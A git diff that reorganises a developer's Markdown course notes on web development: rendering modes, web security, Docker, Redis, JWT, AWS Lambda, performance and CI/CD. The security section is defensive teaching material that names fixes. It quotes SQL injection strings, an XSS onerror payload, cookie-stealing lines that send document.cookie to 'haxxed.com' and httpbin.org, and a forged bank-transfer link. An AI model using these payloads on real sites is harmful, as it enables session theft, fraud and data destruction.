@@ -343,7 +343,7 @@ In Strongly typed languages once a type is assigned to a variable say at run tim
 
 Whereas, in Weakly typed languages, once a type is assigned to a variable say at run-time or compile-time, it can be intermingled in expressions with other types easily.
 
-![Diagram](https://hackernoon.com/photos/hgW8mkSirqYHZWLkYLGuSG13sSA3-2le963zm8)
+![Diagram](https://cdn.hackernoon.com/images/hgW8mkSirqYHZWLkYLGuSG13sSA3-2le963zm8.jpg)
 
 #### Python Example (Dynamic, Interpreted):
 ```python
@@ -510,76 +510,49 @@ Some libraries are of course written in TypeScript, such as material-ui, but som
 [TypeScript code example - Robofriends project](https://github.com/aneagoie/robofriends-typescript-completed)
 
 
+## Server-side rendering (SSR) and Client-side rendering (CSR)
 
+### CSR
 
-server side rendering
-
-csr 
-pros
+#### Pros
 - Rich Interactions
 - Faster Response
 - Web Applications
 
-Cons
+#### Cons
 - Low CEO Potential
 - Longer initial load
 
+### SSR
 
-
-ssr
-Pros
+#### Pros
 - Static Sites
 - SEO
 - Initial Page Load
 
-Cons
+#### Cons
 - Full Page Reloads
 - Slower page rendering
 - Requests to server
 
-server side rendering
-server side rendering react
-nextjs
-gatsby
+[Gatsby](https://www.gatsbyjs.org/)
 
-https://medium.com/@wilbo/server-side-vs-client-side-routing-71d710e9227f
+[Next.js](https://nextjs.org/)
 
-https://www.getfilecloud.com/blog/2015/03/tech-tip-how-to-do-hard-refresh-in-browsers/#.Xpm37shKjIU
+[How to do Hard Refresh in Browsers](https://www.getfilecloud.com/blog/2015/03/tech-tip-how-to-do-hard-refresh-in-browsers/#.Xpm37shKjIU)
 
-next link
+[Server-side vs Client-side Routing](https://medium.com/@wilbo/server-side-vs-client-side-routing-71d710e9227f)
 
-https://nextjs.org/learn/basics/deploying-a-nextjs-app
-
-create next app
-
-npm install
-
-npm audit fix --force
+[When everything's important, nothing is!](https://aerotwist.com/blog/when-everything-is-important-nothing-is/)
 
 
-npm update
+## Security
 
-npm install next@latest
+- [OWASP](https://www.owasp.org/)
+- [Hacksplaining: Security Training for Developers](https://www.hacksplaining.com/lessons)
+- [Watch Your Hack](https://watchyourhack.com/)
 
-
-https://github.com/aneagoie/next-ssr
-
-https://github.com/aneagoie/next-ssr-update
-
-
-https://developers.google.com/search/docs/guides/javascript-seo-basics
-
-https://aerotwist.com/blog/when-everything-is-important-nothing-is/
-
-
-
-
-
-
-
-Security
-
-Star Of Security
+### Star Of Security
 
 - Authentication
 - Do not trust anyone
@@ -593,29 +566,23 @@ Star Of Security
 - 3rd party libraries
 - Injections
 
+### Injections
 
+[Injection Theory](https://owasp.org/www-community/Injection_Theory)
 
+`' or 1=1 --'`
 
+`'; DROP TABLE users; --'`
 
-injections
-- most common
+To fix them:
 
-' or 1=1 --'
-'; DROP TABLE users; --'
-
-https://owasp.org/www-community/Injection_Theory
-
-to fix them:
 - Sanitize input
 - Parametrize Queries
 - Knex.js or other ORMs
 
-
-https://www.hacksplaining.com/lessons
-
 Example that is not SQL
 
-Client side 
+Client side:
 ```html
 <!DOCTYPE html>
 <html>
@@ -665,8 +632,7 @@ const sendToServer = () => {
   })
 ```
 
-server side
-
+Server side:
 ```javascript
 const express = require('express')
 const cors = require('cors')
@@ -696,83 +662,70 @@ app.post('/secret', (req, res) => {
 app.listen(3000, () => console.log('Example app listening on port 3000!'))
 ```
 
-https://www.postgresql.org/download
+### 3rd party libraries
 
+### nsp
 
+Node Security helps you keep your node applications secure.
 
-
-
-
-
-
-
-
-
-
-
-
-3rd party libraries
-
+```bash
 npm install -g nsp
-
 nsp check # audit package.json
+```
 
+### Snyk CLI
 
+Snyk scans and monitors your projects for security vulnerabilities.
+
+```bash
 npm install -g snyk
-
 snyk auth
-
 snyk test # audit node_modules directory
+```
 
+### Logging
 
-
-
-
-
-
-
-
-
-
-
-Logging
-
+```bash
 npm install winston
-
 npm install morgan
+```
 
+### HTTPs everywhere
 
+ssl/tls certificates:
+- [Let's Encrypt](https://letsencrypt.org/)
+- [Cloudflare](https://www.cloudflare.com/)
 
+### XSS (Cross-Site Scripting) & CSRF (Cross-Site Request Forgery)
 
+- [XSS Lesson](https://www.hacksplaining.com/exercises/xss-stored)
+- [CSRF Lesson](https://www.hacksplaining.com/exercises/csrf)
 
-
-https everywhere
-
-ssl/tls certificates
-
-- https://letsencrypt.org
-- cloudflare
-
-
-
-
-xss + csrf
-
+```html
 <img src="/" onerror="alert('boom');">
+```
 
+```javascript
 window.locatiom = 'haxxed.com?cookie=' + document.cookie
+```
 
-
+```html
 <a href="http://netbank.com/transfer.do?acct=AttackerA&amount;=$100">Read more</a>
+```
 
-
+```javascript
 fetch('//httpbin.org/post', {method:'POST',body:document.cookie})
 
 'Content-Security-Policy': "script-src 'self' 'https://api.google.com'"
+```
 
+#### csurf
 
+[Node.js CSRF protection middleware](https://www.npmjs.com/package/csurf)
+
+```bash
 npm install csurf
-
+```
 
 - Sanitize input
 - No eval()
@@ -780,180 +733,55 @@ npm install csurf
 - Content Security Policy
 - Secure + HTTPOnly Cookies
 
+- [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
+- [Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
+- [XSS for dummies](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
 
-https://www.hacksplaining.com/exercises/csrf
+### Store config in the environment
 
+- [12 factor app - Config](https://12factor.net/config)
+- [React environment variables](https://create-react-app.dev/docs/adding-custom-environment-variables/)
+- [dotenv](https://www.npmjs.com/package/dotenv)
 
-https://www.hacksplaining.com/exercises/xss-stored
+### Secure Headers
 
+- [HTTP basics](https://code.tutsplus.com/tutorials/http-the-protocol-every-web-developer-must-know-part-1--net-31177)
+- [Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
+- [Header fields](https://www.tutorialspoint.com/http/http_header_fields.htm)
+- [helmet](https://www.npmjs.com/package/helmet)
+- [cors](https://www.npmjs.com/package/cors)
+- [rate-limit](https://www.npmjs.com/package/rate-limit)
 
+### Data Management
 
-https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
-https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
-https://medium.com/hackernoon/cross-site-scripting-for-dummies-be30f76fad09
+- [bcrypt](https://www.npmjs.com/package/bcrypt)
+- [scrypt](https://www.npmjs.com/package/scrypt)
+- [argon2](https://www.npmjs.com/package/argon2)
+- [pgcrypto](https://www.npmjs.com/package/pgcrypto)
 
+[How to store user passwords](https://rangle.io/blog/how-to-store-user-passwords-and-overcome-security-threats-in-2017/)
 
+### Authentication
 
+[Authentication vs Authorization](https://www.okta.com/identity-101/authentication-vs-authorization/)
 
 
+## Code Analysis
 
+- [Smart Brain](https://github.com/aneagoie/smart-brain)
+- [Smart Brain API](https://github.com/aneagoie/smart-brain-api)
 
+[MySQL vs Postgres](https://developer.okta.com/blog/2019/07/19/mysql-vs-postgres)
+[Postgres vs MySQL](https://blog.panoply.io/postgresql-vs.-mysql)
 
-Code secrets
 
-- Environmental variables
-https://create-react-app.dev/docs/adding-custom-environment-variables/
-https://www.npmjs.com/package/dotenv
+## Docker
 
-- Commit History
+[Docker Hub](https://hub.docker.com/)
 
+[Smart Brain API Dockerized](https://github.com/aneagoie/smart-brain-boost-api-dockerized/commit/a7efbdd56c9fbfb29700c3398286dedd38e56166)
 
-
-
-
-
-Secure Headers
-
-https://github.com/helmetjs/helmet
-- npm install helmet
-
-
-https://code.tutsplus.com/tutorials/http-the-protocol-every-web-developer-must-know-part-1--net-31177
-https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers
-https://www.tutorialspoint.com/http/http_header_fields.htm
-
-
-
-
-
-
-
-
-
-
-
-Access control
-
-- Principal of least privilege
-
-CORS
-
- 
-
-
-
-
-
- data management
-
- - bcrypt, scrypt, aragon2
- - pgcrypto - encrypt a few columns
-
-
-https://rangle.io/blog/how-to-store-user-passwords-and-overcome-security-threats-in-2017/
-
-
-
-
-
-
-
-
- do not trust anyone
-
-Darth Vader Is Everywher
-
-rate limiter
-
-
-
-
-
-Authentication
-
-Authentication vs Authorization
-
-
-
-
-
-
-
-
-
-https://www.hacksplaining.com/lessons
-
-https://watchyourhack.com/
-
-https://owasp.org/
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-Code Analysis
-
-
-Smart brain 
-https://github.com/aneagoie/smart-brain
-
-
-smart brain api
-https://github.com/aneagoie/smart-brain-api
-
-
-
-https://developer.okta.com/blog/2019/07/19/mysql-vs-postgres
-
-https://blog.panoply.io/postgresql-vs.-mysql
-
-
-
-
-
-
-
-
-
-
-
-
-
-Docker
-
-https://hub.docker.com/
-
-
-
-create Dockerfile
-```
-FROM node:carbon
-
-CMD ["/bin/bash"]
-```
-
-or
-
-```
-FROM node:8.11.1
-
-CMD ["/bin/bash"]
-```
-
+```bash
 docker build -t tagname .
 
 docker run -it tagname
@@ -966,9 +794,6 @@ docker run -it tagname
 
 docker run tagname
 
-https://unix.stackexchange.com/questions/398543/what-are-the-contents-of-bin-bash-and-what-do-i-do-if-i-accidentally-overwrote
-
-
 docker run -t -d tagname
 
 docker ps
@@ -977,164 +802,20 @@ docker exec -it CONTAINER ID bash
 
 docker stop CONTAINER ID
 
-```
-FROM node:8.11.1
-
-WORKDIR /usr/src/smart-brain-api
-
-COPY ./ ./
-
-RUN npm install
-
-CMD ["/bin/bash"]
-```
-
 docker run -it -p 3000:3000 tagname
 
-https://docs.docker.com/engine/reference/builder/#usage
-
-
-
-
 docker compose
-
-docker-compose.yml
-
-```
-version: '3.6'
-
-
-services:
-	smart-brain-api:
-		container_name: backend
-		build: ./
-		command: npm start
-		working_dir: /usr/src/smart-brain-api
-		ports:
-			- "3000:3000"
-```
 
 docker-compose build
 
 docker-compose run smart-brain-api
 
-everytime you change the yml file
-you need to run docker-composer build 
-to re-read that file
-
-
 docker-compose down
 
 docker-compose up --build
-
-
-
-
-```
-version: '3.6'
-
-
-services:
-	smart-brain-api:
-		container_name: backend
-		build: ./
-		command: npm start
-		working_dir: /usr/src/smart-brain-api
-		ports:
-			- "3000:3000"
-		volumes:
-			- ./:/usr/src/smart-brain-api
 ```
 
-
-https://stackoverflow.com/questions/34809646/what-is-the-purpose-of-volume-in-dockerfile
-
-
-https://www.linux.com/topic/cloud/docker-volumes-and-networks-compose/
-
-
-docker-compose exec smart-brain-api bash
-
-
-
-docker-compose up -d
-
-
-
-
-
-```
-version: '3.6'
-
-services:
-	# Backend API
-	smart-brain-api:
-		container_name: backend
-		build: ./
-		command: npm start
-		working_dir: /usr/src/smart-brain-api
-		environment:
-			POSTGRES_URI: postgres://sally:secret@postgres:5432/smart-brain-docker
-		links:
-			- postgres
-		ports:
-			- "3000:3000"
-		volumes:
-			- ./:/usr/src/smart-brain-api
-
-	# Postgres
-	postgres:
-		image: postgres
-		environment:
-			POSTGRES_USER: sally
-			POSTGRES_PASSWORD: secret
-			POSTGRES_DB: smart-brain-docker
-			POSTGRES_HOST: postgres
-		ports:
-			- "5432:5432"
-```
-
-
-```
-const db = knex({
-	client: 'pg',
-	connection: process.env.POSTGRES_URI
-});
-```
-
-
-https://www.postgresql.org/docs/9.2/app-psql.html
-
-
-https://hub.docker.com/_/postgres/
-
-
-- create a postgres folder on smart-brain-api
-- create a Dockerfile inside postgres folder
-```
-FROM postgres:10.3
-
-ADD /tables/ /docker-entrypoint-initdb.d/tables/
-ADD deploy_schemas.sql /docker-entrypoint-initdb.d/
-```
-- create a new folder inside postgress folder called tables
-- within the tables folder create 2 foles: login.sql and user.sql (with the create table commands)
-- In the SQL files use transaction
-```
-BEGIN TRANSACTION;
-
-SQL COMMAND
-
-COMMIT;
-```
-- create a file called deploy_schemas.sql within the postgres folder
-```
--- Deploy fresh database tables
-\i '/docker-entrypoint-initdb.d/tables/users.sql'
-\i '/docker-entrypoint-initdb.d/tables/login.sql'
-```
-- Change the docker-compose.yml file
-```
+```dockerfile
 version: '3.6'
 
 services:
@@ -1164,100 +845,11 @@ services:
 		ports:
 			- "5432:5432"
 ```
-- Change the deploy_schemas.sql file
-```
--- Deploy fresh database tables
-\i '/docker-entrypoint-initdb.d/tables/users.sql'
-\i '/docker-entrypoint-initdb.d/tables/login.sql'
-\i '/docker-entrypoint-initdb.d/seed/seed.sql'
-```
-- create another folder called seed with the file seed.sql inside
-```
-BEGIN TRANSACTION;
-
-INSERT INTO users (name, email, entries, joined) VALUES ('a', 'a@gmail.com', 1, '2020-01-01');
-INSERT INTO login (hash, email) VALUES ('$2y$12$ed1Dma30h074Xzb1f72qkODPXQimswqTnDksSRIRVogPwfzFDUn2W', 'a@gmail.com');
-
-COMMIT;
-```
-- change dockerfile inside postgres folder
-```
-FROM postgres:10.3
-
-ADD /tables/ /docker-entrypoint-initdb.d/tables/
-ADD /seed/ /docker-entrypoint-initdb.d/seed/
-ADD deploy_schemas.sql /docker-entrypoint-initdb.d/
-```
 
 
-morgan with combined config was intalled in the smart-brain-api
+## Redis
 
-
-http://joshualande.com/create-tables-sql
-
-https://hub.docker.com/_/postgres/
-
-
-smart-brain-api dockerized
-https://github.com/aneagoie/smart-brain-boost-api-dockerized/commit/a7efbdd56c9fbfb29700c3398286dedd38e56166
-
-
-Update: Docker Networks
-Docker is constantly evolving. One of the features that has changed is the links property you have seen in previous videos while writing our docker compose file. Links have been replaced by networks. Docker describes them as a legacy feature that you should avoid using. You can safely remove the link and the two containers will be able to refer to each other by their service name (or container_name). So in our case all you would need to do is remove the below lines from your Docker Compose file and everything should still work fine:
-
-    links:
-      - postgres
-      - redis
-
-
-By default Compose sets up a single network for your app. Each container for a service joins the default network and is both reachableby other containers on that network, and discoverable by them at a hostname identical to the container name. If you want a custom network, you can use the networks property.
-If you want to read more about this, you can check out the official documentation here, or read this stackoverflow answer.
-
-Don't get too confused by this though. This gets into some really advanced networking that is very specialized. The big takeaway is that you no longer need the links property.
-
-https://docs.docker.com/network/links/
-
-https://docs.docker.com/engine/reference/commandline/network_create/
-
-https://docs.docker.com/compose/networking/
-
-https://stackoverflow.com/questions/41294305/docker-compose-difference-between-network-and-link
-
-
-
-
-
-
-
-
-
-
-
-
-
-Redis
-
-https://image.slidesharecdn.com/moniruzzamanpptxnosqldatabase-150327224221-conversion-gate01/95/nosql-database-classification-characteristics-and-comparison-5-638.jpg?cb=1427496253
-
-https://gpinaki.files.wordpress.com/2014/01/nosql-classification1.png
-
-https://hub.packtpub.com/different-types-of-nosql-databases-and-when-to-use-them/
-
-https://redis.io/
-
-https://codeburst.io/redis-what-and-why-d52b6829813
-
-https://www.objectrocket.com/blog/how-to/top-5-redis-use-cases/
-
-https://stackoverflow.com/questions/52196678/what-are-atomic-operations-for-newbies
-
-https://dev.to/trevoirwilliams/relational-sql-vs-non-relational-nosql-databases-hi5
-
-https://redis.io/download
-
-http://try.redis.io/
-
-https://redis.io/commands
+[Redis](https://redis.io/)
 
 ```
 > SET name "TestName"
@@ -1289,13 +881,10 @@ OK
 2) "5"
 ```
 
-https://redis.io/topics/data-types-intro
-
-https://redis.io/topics/data-types
-
 types
  - string
  - hashes
+
 ```
 > HMSET user id 45 name "TestName"
 OK
@@ -1310,7 +899,8 @@ OK
 2) "45"
 3) "name"
 ```
- - list
+
+list:
 ```
 > LPUSH ourlist 10
 (integer) 1
@@ -1335,7 +925,8 @@ OK
 1) "55"
 2) "10"
 ```
- - Sets (unordered) (not allowing repeated values)
+
+sets (unordered) (not allowing repeated values):
 ```
 > SADD ourset 1 2 3 4 5
 (integer) 5
@@ -1368,7 +959,8 @@ OK
 > SISMEMBER ourset 9
 (integer) 0
 ```
- - Ordered Sets
+
+ordered sets:
 ```
 > ZADD team 50 "Wizards"
 (integer) 1
@@ -1388,167 +980,35 @@ OK
 ```
 
 
+## Sessions + JWT
 
+- [Cookies vs Tokens](https://dzone.com/articles/cookies-vs-tokens-the-definitive-guide)
+- [Cookie-Based Auth](https://cdn.auth0.com/blog/cookies-vs-tokens/cookie-token-auth.png)
+- [Token Authentication vs. Cookies](https://stackoverflow.com/questions/17000835/token-authentication-vs-cookies)
+- [Refresh Tokens](https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/)
+- [Bearer](https://security.stackexchange.com/questions/108662/why-is-bearer-required-before-the-token-in-authorization-header-in-a-http-re)
+- [Introduction to localStorage and sessionStorage](https://www.digitalocean.com/community/tutorials/js-introduction-localstorage-sessionstorage)
 
+- [Smart Brain Boost](https://github.com/aneagoie/smart-brain-boost/commits/master)
+- [Smart Brain Boost API](https://github.com/aneagoie/smart-brain-boost-api)
+- [Smart Brain Boost API Dockerized](https://github.com/aneagoie/smart-brain-boost-api-dockerized)
 
 
+## AWS
 
+[Amazon Web Services](https://aws.amazon.com/)
 
+Services:
+- [Amazon EC2](https://aws.amazon.com/ec2/)
+- [Amazon S3](https://aws.amazon.com/s3/)
+- [DynamoDB](https://aws.amazon.com/dynamodb/)
+- [Amazon Lambda](https://aws.amazon.com/lambda/)
 
+[Smart Brain Boost Lambda](https://github.com/aneagoie/smart-brain-boost-lambda)
 
+- [serverless](https://www.npmjs.com/package/serverless)
 
-
-
-
-
-Sessions + JWT
-
-https://dzone.com/articles/cookies-vs-tokens-the-definitive-guide
-
-https://cdn.auth0.com/blog/cookies-vs-tokens/cookie-token-auth.png
-
-https://stackoverflow.com/questions/17000835/token-authentication-vs-cookies
-
-https://scotch.io/bar-talk/why-jwts-suck-as-session-tokens
-
-https://medium.com/better-programming/when-to-use-callback-function-of-setstate-in-react-37fff67e5a6c
-
-https://stackoverflow.com/questions/42038590/when-to-use-react-setstate-callback
-
-https://reactjs.org/docs/portals.html
-
-https://www.w3schools.com/charsets/ref_html_entities_4.asp
-
-https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/
-
-https://security.stackexchange.com/questions/108662/why-is-bearer-required-before-the-token-in-authorization-header-in-a-http-re
-
-improvements
-
-Task 1: Add pet  and age  column to the database and allow users to update these fields on their profile.
-
-Task 2: Implement token flow as we have done so far for /register  end point as well.
-
-Task 3: Add Sign out functionality where you revoke the token when a user signs out of the app
-
-Task 4 (Bonus): You may notice a lot of repeated code (especially when it comes to fetch()). How can you improve this? Try to refactor the code and perhaps also improve the logic to make the app even better!
-
--
-
-pesquisar sessionstorage e dif entre localstorage
-
-update node version on dockerfile
-upgrade docker compose file
-implement morgan 
-change bcrypt-nodejs to bcrypt or bcrypt.js
-update packages
-refactor code with async await for example
-
--
-
-https://github.com/aneagoie/smart-brain-boost/commits/master
-
-https://github.com/aneagoie/smart-brain-boost-api
-
-https://github.com/aneagoie/smart-brain-boost-api-dockerized
-
-
-
-
-
-
-
-
-
-
-
-AWS
-
-amazon web services
-
-
-front 
-ec2
-s3
-dynamodb
-lambda
-
-
-aws diagrams
-
-aws flows
-
-Monolithic vs Micro-services
-
-
-lambda functions
-
-- create function
-- name: rankly
-- nodejs last version
-- choose a custom role
-- create
-
-
-use a tool called serverless to deploy the function
-instead of using the aws dashboard
-
-Just a heads up that since the next video was created, AWS Lambda uses the async version of the hello function rather than the callback. It instead looks something like this:
-
-'use strict'; 
-module.exports.hello = async (event, context) => {  
-    return {    
-        statusCode: 200,    
-        body: JSON.stringify({      
-            message: 'Go Serverless v1.0! Your function executed successfully!',      
-            input: event,    
-        }),  
-    };    
-// Use this code if you don't use the http event with the LAMBDA-PROXY integration  
-// return { message: 'Go Serverless v1.0! Your function executed successfully!', event };
-};
-
-Underneath it all, it is still doing the same thing as you will see in this video coming up
-
-
-
-sudo npm install -g serverless
-
-sls create -t aws-nodejs
-
-mkdir rankly
-
--copy the files to the new folder
-
-> handler.js is the function
-
-
-aws iam
-
-add a user rankly-lambda with programmatic access
-atach existing policies - administration access
-
-- user the user from iam to cconfigure the serverless
-sls config credentials --provider aws --key MYKEY --secret MYSECRET
-
-https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_manage.html
-
-https://www.serverless.com/framework/docs/providers/aws/guide/iam/
-
-- uptade the name of the service in serverless.yaml file
-
-- create a http event in yaml file above the function handler definition
-
-- update the stage to prod on yaml file
-
-```
-events:
-	- http:
-		path: rank
-		method: get
-```
-
-```
+```javascript
 'use strict';
 
 const emojis = [
@@ -1575,89 +1035,39 @@ module.exports.hello = (event, context, callback) => {
 };
 ```
 
-tto deploy just run
-- sls deploy
 
-you can access the function by the url provided after the deploy
+## Performance part 3
 
-
-to run
-- sls invoke --function rank
-
-to run locally
-- sls invoke local --function rank
-
-
-
-update fron end side
-
-- component rank
-- 
-
-https://github.com/aneagoie/smart-brain-boost-lambda
-
-
-
-
-As a bonus and if you really want to challenge yourself, try and implement this feature:
-
-Ability for users to upload new pictures to their profile. 
-
-As an idea, you can use an upload profile button to trigger a lambda function that uploads the image to an S3 bucket where you store user profile pictures. Good luck!
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-Performance part 3
-
-
-
-Backend
+Backend:
 
 - CDNs
-	- content delivery network
-		-pros and cons
-		-cache
-	- cloudflare
-	- hoe to configure
-	- dns name servers
+	- Content Delivery Network
+        - Pros and Cons
+        - Cache
+	- Cloudflare
+	- How to configure
+	- DNS name servers
 - GZIP
-	- npm install compression (as a middleeware in a express api)
-	- github pages does it automatically
-	- how to configure in different seervers
-	- https://github.com/google/brotli is a little bit better than gzip
+    - npm install compression (as a middleware in an express api)
+    - GitHub pages does it automatically
+    - How to configure in different servers
+    - [Brotli](https://github.com/google/brotli) is a little better than GZIP
 - DB Scaling
 	- Six items that are the main ways that a database can scale
 		- Identify Inefficient Queries
-			- use indexing (pros and cons)
+			- Use indexing (Pros and Cons)
 		- Increase Memory
 		- Vertical Scaling (Redis, Memcached)
 		- Sharding
 		- More Databases
 		- Database type
 - Caching
-	- cahe in browser
-	- how to control the cache in browsers
-	- caching brusting (in react)
-	- http cache
+	- Cache in browser
+	- How to control the cache in browsers
+	- Cache busting (in react)
+	- HTTP cache
 		- Cache-Control and ETag header in http requests
-		- https://blogs.sap.com/wp-content/uploads/2020/03/http-request.png
-		-
+
 ```javascript
 const express = require('express')
 const cors = require('cors')
@@ -1673,48 +1083,34 @@ app.get('/hi', (req, res) => {
 	res.send(new Buffer('<h2>Test String</h2>'))
 })
 ```
-	- https://medium.freecodecamp.org/the-hidden-components-of-web-caching-970854fe2c49
-	- https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching
-	- https://devcenter.heroku.com/articles/increasing-application-performance-with-http-cache-headers
-- Load Balancing
-	- apache and nginx
-	- aws load balancer
-	- nginx can be used as a load balancer and can cache the static files as well
-	- https://github.com/aneagoie/load-balancer-exercise
-	- load balancing test
-	- there are a lot o packages for example loadtest
-	- sudo npm install -g loadtest
-	- loadtest -t 5 -c 100 --rps 100 http>//localhost:80
-	- run 1 time with the docker (load balancer) and otheer with just the single server (npm start) and see the difference increasing the params test like loadtest -t 5 -c 1000 --rps 500 http://localhost:80
-	- because we are running this on a container it is slower than if we actually implemented load balancing properly
-	- try to make the loadbalancer faster than single server#
-	- https://nginx.org/en/docs/
-	- https://www.linode.com/docs/web-servers/nginx/how-to-configure-nginx/
+
+- [The hidden components of Web Caching](https://medium.freecodecamp.org/the-hidden-components-of-web-caching-970854fe2c49)
+- [Prevent unnecessary network requests with the HTTP Cache](https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching)
+- [Increasing Application Performance with HTTP Cache Headers](https://devcenter.heroku.com/articles/increasing-application-performance-with-http-cache-headers)
+
+Load Balancing:
+- Apache and Nginx
+- AWS load balancer
+- Nginx can be used as a load balancer and can cache the static files as well
+- Load balancing test
+- There are a lot o packages for example `loadtest`
+- `sudo npm install -g loadtest`
+- `loadtest -t 5 -c 100 --rps 100 http>//localhost:80`
+- Run 1 time with the docker (load balancer) and other with just the single server (npm start) and see the difference increasing the params test like `loadtest -t 5 -c 1000 --rps 500 http://localhost:80`
+- Because we are running this on a container it is slower than if we actually implemented load balancing properly
+- Try to make the load balancer faster than single server
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-CI/CD
+## CI/CD
 
 - Continuous Integration, Continuous Delivery, Continuous Deployment
-- benefits
-- small incremental changes
-- circle ci
-- circle ci and github
-- ci with github
-- https://code-maze.com/top-8-continuous-integration-tools/
-- https://github.com/aneagoie/robofriends-ci
-- config.yaml example
+- Benefits
+- Small incremental changes
+- CircleCI, Travis CI, Jenkins, GitHub Actions, or any other CI/CD tool
+
+[Robofriends CI](https://github.com/aneagoie/robofriends-ci)
+
+config.yaml example:
 ```
 version: 2
 jobs:
@@ -1748,78 +1144,24 @@ workflows:
           requires:
             - hithere
 ```
-- exec prettier on pre commit hook
-- https://prettier.io/docs/en/precommit.html
-- webpack-bundle-analyzer package
-- search for ci/cd process used by companies
-- staging environment
-- code review
-- acceptance test
-- smoke test
-- new relic
-- graphana
+
+- Execute Prettier on pre commit hook
+- `webpack-bundle-analyzer` package
+- Search for ci/cd process used by companies
+- Staging environment
+- Code review
+- Acceptance test
+- Smoke test
+- [New Relic](https://newrelic.com/docs/features/new-relic-apm)
+- [Grafana](https://grafana.com/grafana/dashboards/12)
 
 
+## Extra Bits
 
+### Complexity vs Simplicity
 
-
-
-
-
-
-
-
-
-Extra Bits
-
-- Complexity vs Simplicity
-Always choose simplicity over complexity
-Complexity and Simplicity is on a spectrum not binary, It's not either simplistic or complex. That means it's not right or wrong
-
-- NPM is not your friend
-npm install is not your answer
-
+- Always choose simplicity over complexity
+- Complexity and Simplicity is on a spectrum not binary, It's not either simplistic or complex. That means it's not right or wrong
+- NPM is not your friend (`npm install` is not your answer)
 - Learn to Learn
-
 - Start with Why
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
